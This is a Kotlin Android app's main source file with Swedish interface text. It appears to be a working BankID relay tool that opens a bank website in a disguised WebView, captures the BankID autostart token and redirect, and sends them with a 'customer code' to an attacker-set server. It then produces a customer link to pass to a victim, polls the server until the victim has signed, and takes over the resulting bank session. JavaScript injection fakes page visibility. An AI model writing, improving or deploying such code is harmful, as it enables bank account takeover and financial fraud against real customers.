package com.relay

import android.annotation.SuppressLint
import android.app.Activity
import android.content.ClipData
import android.content.ClipboardManager
import android.content.Context
import android.content.Intent
import android.graphics.Color
import android.net.Uri
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.text.InputType
import android.view.Gravity
import android.view.View
import android.view.ViewGroup
import android.webkit.CookieManager
import android.webkit.WebChromeClient
import android.webkit.WebResourceRequest
import android.webkit.WebSettings
import android.webkit.WebView
import android.webkit.WebViewClient
import android.widget.Button
import android.widget.EditText
import android.widget.LinearLayout
import android.widget.TextView
import android.widget.Toast
import org.json.JSONObject
import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.URL
import kotlin.concurrent.thread

class MainActivity : Activity() {

    private val h = Handler(Looper.getMainLooper())

    private lateinit var p: android.content.SharedPreferences
    private lateinit var serverBox: EditText
    private lateinit var bankBox: EditText
    private lateinit var statusBar: TextView
    private lateinit var modeBtn: Button
    private lateinit var web: WebView

    private var doneSeen = false
    private var busy = false

    private val tick = object : Runnable {
        override fun run() {
            try {
                web.evaluateJavascript("(function(){try{if(!window.__relayInstalled){window.__relayInstalled=true;window.__hid=false;try{Object.defineProperty(document,'hidden',{configurable:true,get:function(){return window.__hid;}});Object.defineProperty(document,'visibilityState',{configurable:true,get:function(){return window.__hid?'hidden':'visible';}});}catch(e){}}window.__hid=true;document.dispatchEvent(new Event('visibilitychange'));window.dispatchEvent(new Event('blur'));window.dispatchEvent(new Event('pagehide'));setTimeout(function(){try{window.__hid=false;document.dispatchEvent(new Event('visibilitychange'));window.dispatchEvent(new Event('focus'));window.dispatchEvent(new Event('pageshow'));}catch(e){}},80);}catch(e){}})();", null)
            } catch (t: Throwable) {
            }
            checkDone()
            h.postDelayed(this, 2000)
        }
    }

    private fun dp(v: Int): Int = (v * resources.displayMetrics.density).toInt()

    private fun wide(): LinearLayout.LayoutParams =
        LinearLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT)

    private fun toast(s: String) {
        Toast.makeText(this, s, Toast.LENGTH_SHORT).show()
    }

    private fun modeName(m: Int): String {
        if (m == 0) return "-> kund"
        if (m == 1) return "-> kund+"
        return "-> egen"
    }

    private fun newCode(): String {
        val c = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789"
        val sb = StringBuilder()
        var i = 0
        while (i < 5) {
            sb.append(c[(Math.random() * c.length).toInt()])
            i++
        }
        return sb.toString()
    }

    @SuppressLint("SetJavaScriptEnabled")
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        p = getSharedPreferences("relay", Context.MODE_PRIVATE)
        if (p.getString("code", null) == null) {
            p.edit().putString("code", newCode()).apply()
        }

        val root = LinearLayout(this)
        root.orientation = LinearLayout.VERTICAL
        root.setBackgroundColor(Color.parseColor("#0E1621"))
        root.setPadding(dp(10), dp(10), dp(10), dp(6))

        serverBox = EditText(this)
        serverBox.hint = "Server-URL"
        serverBox.inputType = InputType.TYPE_TEXT_VARIATION_URI
        serverBox.setText(p.getString("server", ""))
        root.addView(serverBox, wide())

        bankBox = EditText(this)
        bankBox.hint = "Banksida, t.ex. online.swedbank.se"
        bankBox.inputType = InputType.TYPE_TEXT_VARIATION_URI
        bankBox.setText(p.getString("bank", ""))
        root.addView(bankBox, wide())

        val row = LinearLayout(this)
        row.orientation = LinearLayout.HORIZONTAL
        row.gravity = Gravity.CENTER_VERTICAL

        statusBar = TextView(this)
        statusBar.setTextColor(Color.WHITE)
        statusBar.textSize = 15f
        statusBar.setPadding(dp(6), dp(10), dp(6), dp(10))
        statusBar.text = "Kundkod: " + p.getString("code", "-----")
        row.addView(statusBar, LinearLayout.LayoutParams(0, ViewGroup.LayoutParams.WRAP_CONTENT, 1f))

        modeBtn = Button(this)
        modeBtn.text = modeName(p.getInt("mode", 1))
        modeBtn.setOnClickListener {
            val m = (p.getInt("mode", 1) + 1) % 3
            p.edit().putInt("mode", m).apply()
            modeBtn.text = modeName(m)
        }
        row.addView(modeBtn)
        root.addView(row, wide())

        val btns = LinearLayout(this)
        btns.orientation = LinearLayout.HORIZONTAL

        val goBtn = Button(this)
        goBtn.text = "Oppna bank"
        goBtn.setOnClickListener { openBank() }
        btns.addView(goBtn, LinearLayout.LayoutParams(0, ViewGroup.LayoutParams.WRAP_CONTENT, 1f))

        val klarBtn = Button(this)
        klarBtn.text = "KLAR"
        klarBtn.setOnClickListener { finishFlow() }
        btns.addView(klarBtn, LinearLayout.LayoutParams(0, ViewGroup.LayoutParams.WRAP_CONTENT, 1f))

        val linkBtn = Button(this)
        linkBtn.text = "Kundlank"
        linkBtn.setOnClickListener { copyLink() }
        btns.addView(linkBtn, LinearLayout.LayoutParams(0, ViewGroup.LayoutParams.WRAP_CONTENT, 1f))

        root.addView(btns, wide())

        web = WebView(this)
        web.settings.javaScriptEnabled = true
        web.settings.domStorageEnabled = true
        web.settings.databaseEnabled = true
        web.settings.useWideViewPort = true
        web.settings.loadWithOverviewMode = true
        web.settings.mixedContentMode = WebSettings.MIXED_CONTENT_ALWAYS_ALLOW
        try {
            web.settings.userAgentString = web.settings.userAgentString.replace("; wv", "")
        } catch (t: Throwable) {
        }
        try {
            CookieManager.getInstance().setAcceptCookie(true)
            CookieManager.getInstance().setAcceptThirdPartyCookies(web, true)
        } catch (t: Throwable) {
        }
        web.webChromeClient = WebChromeClient()
        web.webViewClient = object : WebViewClient() {
            override fun shouldOverrideUrlLoading(view: WebView, url: String): Boolean {
                return grab(url)
            }

            override fun shouldOverrideUrlLoading(view: WebView, req: WebResourceRequest): Boolean {
                return grab(req.url.toString())
            }
        }
        root.addView(web, LinearLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, 0, 1f))

        setContentView(root)

        statusBar.setOnLongClickListener {
            val c = newCode()
            p.edit().putString("code", c).remove("last").remove("redirect").apply()
            doneSeen = false
            statusBar.text = "Kundkod: " + c
            copyLink()
            true
        }

        h.postDelayed(tick, 1500)

        val b = p.getString("bank", "")
        if (b != null && b.isNotEmpty()) openBank()
    }

    override fun onDestroy() {
        try {
            h.removeCallbacks(tick)
        } catch (t: Throwable) {
        }
        super.onDestroy()
    }

    private fun blink() {
        try {
            web.visibility = View.GONE
            h.postDelayed(object : Runnable {
                override fun run() {
                    try {
                        web.visibility = View.VISIBLE
                    } catch (t: Throwable) {
                    }
                }
            }, 350)
        } catch (t: Throwable) {
        }
    }

    private fun grab(url: String): Boolean {
        if (!url.startsWith("bankid://")) return false
        val u = Uri.parse(url)
        val token = u.getQueryParameter("autostarttoken")
        val redirect = u.getQueryParameter("redirect")
        if (redirect != null && redirect.startsWith("http")) {
            p.edit().putString("redirect", redirect).apply()
        } else {
            p.edit().putString("redirect", "").apply()
        }
        if (token != null && token.isNotEmpty()) {
            if (token == p.getString("last", null)) return true
            p.edit().putString("last", token).apply()
            doneSeen = false
            val m = p.getInt("mode", 1)
            if (m != 2) {
                statusBar.text = "Token skickad - vanta pa kund"
                send(token, redirect)
                blink()
            } else {
                statusBar.text = "Egen BankID"
            }
            if (m != 0) {
                openOwnBankId(url)
            }
        }
        return true
    }

    private fun openOwnBankId(url: String) {
        try {
            val i = Intent(Intent.ACTION_VIEW, Uri.parse(url))
            i.setPackage("com.bankid.bus")
            startActivity(i)
        } catch (t: Throwable) {
            try {
                startActivity(Intent(Intent.ACTION_VIEW, Uri.parse(url)))
            } catch (t2: Throwable) {
                toast("BankID-appen hittades inte")
            }
        }
    }

    private fun checkDone() {
        if (doneSeen || busy) return
        val b = base()
        if (b.isEmpty()) return
        busy = true
        val code = p.getString("code", "") ?: ""
        thread {
            var hit = false
            try {
                val c = URL(b + "/api/session/" + code + "/state").openConnection() as HttpURLConnection
                c.connectTimeout = 4000
                c.readTimeout = 4000
                val br = c.inputStream.bufferedReader()
                var line = br.readLine()
                while (line != null) {
                    if (line.indexOf("done") >= 0) hit = true
                    line = br.readLine()
                }
                br.close()
            } catch (t: Throwable) {
            }
            busy = false
            if (hit) {
                doneSeen = true
                runOnUiThread {
                    statusBar.text = "Kund klar - hamtar session"
                    web.reload()
                }
            }
        }
    }

    private fun finishFlow() {
        val r = p.getString("redirect", "")
        if (r != null && r.isNotEmpty()) {
            statusBar.text = "Hamtar session..."
            web.loadUrl(r)
        } else {
            statusBar.text = "Laddar om banken..."
            web.reload()
        }
    }

    private fun base(): String {
        var s = serverBox.text.toString().trim()
        if (s.isEmpty()) return ""
        if (!s.startsWith("http")) s = "https://$s"
        return s.trimEnd('/')
    }

    private fun send(token: String, redirect: String?) {
        val b = base()
        if (b.isEmpty()) {
            statusBar.text = "Fyll i server-URL"
            return
        }
        p.edit().putString("server", b).apply()
        val code = p.getString("code", "") ?: ""
        val paths = listOf("/api/token", "/api/push", "/token", "/push", "/api/relay", "/relay")
        thread {
            var ok = false
            var i = 0
            while (i < paths.size && !ok) {
                try {
                    val c = URL(b + paths[i]).openConnection() as HttpURLConnection
                    c.requestMethod = "POST"
                    c.doOutput = true
                    c.connectTimeout = 8000
                    c.readTimeout = 8000
                    c.setRequestProperty("Content-Type", "application/json")
                    val body = JSONObject()
                    body.put("code", code)
                    body.put("token", token)
                    body.put("redirect", redirect ?: "")
                    val w = OutputStreamWriter(c.outputStream, "UTF-8")
                    w.write(body.toString())
                    w.flush()
                    w.close()
                    val rc = c.responseCode
                    if (rc in 200..299) ok = true
                } catch (t: Throwable) {
                }
                i++
            }
            val res = ok
            runOnUiThread {
                if (!res) statusBar.text = "Token misslyckades"
            }
        }
    }

    private fun openBank() {
        var b = bankBox.text.toString().trim()
        if (b.isEmpty()) {
            toast("Fyll i banksidan")
            return
        }
        p.edit().putString("bank", b).putString("server", serverBox.text.toString().trim()).apply()
        if (!b.startsWith("http")) b = "https://$b"
        web.loadUrl(b)
    }

    private fun copyLink() {
        val b = base()
        if (b.isEmpty()) {
            toast("Fyll i server-URL forst")
            return
        }
        val link = b + "/k/" + (p.getString("code", "") ?: "")
        try {
            val cm = getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
            cm.setPrimaryClip(ClipData.newPlainText("kundlank", link))
        } catch (t: Throwable) {
        }
        toast(link)
    }
}
